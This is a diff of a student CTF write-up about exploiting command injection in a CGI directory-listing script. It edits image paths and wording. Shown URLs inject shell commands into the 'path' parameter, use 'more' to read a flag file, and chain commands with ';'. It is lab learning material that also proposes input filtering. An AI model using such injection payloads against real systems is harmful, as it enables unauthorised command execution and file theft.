@@ -4,7 +4,7 @@ This document is a brief explanation of our resolution of the Environment Variab
 
 <div align="center">
     <figure>
-        <img src="fotos/CTF4_1.png" width="550">
+        <img src="images/CTF4/CTF4_1.png" width="550">
         <figcaption style="font-size: smaller;">Image of the site.</figcaption>
     </figure>
 </div>
@@ -19,11 +19,11 @@ URL do teste = http://ctf-fsi.fe.up.pt:5002/cgi-bin/list.cgi?path=teste
 
 <div align="center">
     <figure>
-        <img src= fotos/CTF4_2.png width="550" >
+        <img src= images/CTF4/CTF4_2.png width="550" >
         <figcaption style="font-size: smaller;">Image of the site searching for "teste".</figcaption>
     </figure>
     <figure>    
-        <img src= fotos/CTF4_3.png width="550" >
+        <img src= images/CTF4/CTF4_3.png width="550" >
         <figcaption style="font-size: smaller;">Image of the site after searching "teste".</figcaption>
     </figure>
 </div>
@@ -47,11 +47,11 @@ That gave us a list of all the directories present in the root.
 
 <div align="center">
     <figure>
-        <img src= fotos/CTF4_4.png width="550" >
+        <img src= images/CTF4/CTF4_4.png width="550" >
         <figcaption style="font-size: smaller;">Image of the site searching for "/".</figcaption>
     </figure>
     <figure>    
-        <img src= fotos/CTF4_5.png width="550" >
+        <img src= images/CTF4/CTF4_5.png width="550" >
         <figcaption style="font-size: smaller;">Image of the site after searching "/"</figcaption>
     </figure>
 </div>
@@ -66,7 +66,7 @@ URL entering var = http://ctf-fsi.fe.up.pt:5002/cgi-bin/list.cgi?path=%2Fvar
 
 <div align="center">
     <figure>
-        <img src="fotos/CTF4_6.png" width="550">
+        <img src="images/CTF4/CTF4_6.png" width="550">
         <figcaption style="font-size: smaller;">Image of the site after changing the URL to "...%2Fvar".</figcaption>
     </figure>
 </div>
@@ -77,7 +77,7 @@ URL entering flag = http://ctf-fsi.fe.up.pt:5002/cgi-bin/list.cgi?path=%2Fvar%2F
 
 <div align="center">
     <figure>
-        <img src="fotos/CTF4_7.png" width="550">
+        <img src="images/CTF4/CTF4_7.png" width="550">
         <figcaption style="font-size: smaller;">Image of the site after changing the URL to "...%2Fvar%2Fflag".</figcaption>
     </figure>
 </div>
@@ -91,11 +91,11 @@ URL entering flag.txt using "cat" = http://ctf-fsi.fe.up.pt:5002/cgi-bin/list.cg
 With this command it didn't work, so we searched for some other command that would do the same thing. 
 We found "more" and "less" that had basically the same function of reading the file.
 
-URL entering flag.txt using "more" = http://ctf-fsi.fe.up.pt:5002/cgi-bin/list.cgi?path=%2F+more%20%2Fvar%2Fflag%2Fflag.txt /+more
+URL entering flag.txt using "more" = http://ctf-fsi.fe.up.pt:5002/cgi-bin/list.cgi?path=%2F+more%20%2Fvar%2Fflag%2Fflag.txt
 
 <div align="center">
     <figure>
-        <img src="fotos/CTF4_8.png" width="550">
+        <img src="images/CTF4/CTF4_8.png" width="550">
         <figcaption style="font-size: smaller;">Image of the site after changing the url to be "...%2F+more%20%2Fvar%2Fflag%2Fflag.txt".</figcaption>
     </figure>
 </div>
@@ -111,15 +111,15 @@ Other way to solve this is to filter the input that the user can write, because 
 
 ### Extras about the attack
 
-The way we operated this attack is very straightforward, because there were no other commands.
+The way we operated this attack is very straightforward, because the code doesn't stop even though we are running chain commands.
 
-If chain commands were needed, a ";" could be added to separate the various commands ("%3B" if using the URL), still allowing the attacker to perform the exploit.
+If the way we attacked didn't work, a ";" could be added to separate the various commands ("%3B" if using the URL), still allowing the attacker to perform the exploit.
 
 URL with ";" : http://ctf-fsi.fe.up.pt:5002/cgi-bin/list.cgi?path=%3B+more%20%2Fvar%2Fflag%2Fflag.txt
 
 <div align="center">
     <figure>
-        <img src="fotos/CTF4_9.png" width="550">
+        <img src="images/CTF4/CTF4_9.png" width="550">
         <figcaption style="font-size: smaller;">Image of the site.</figcaption>
     </figure>
 </div>
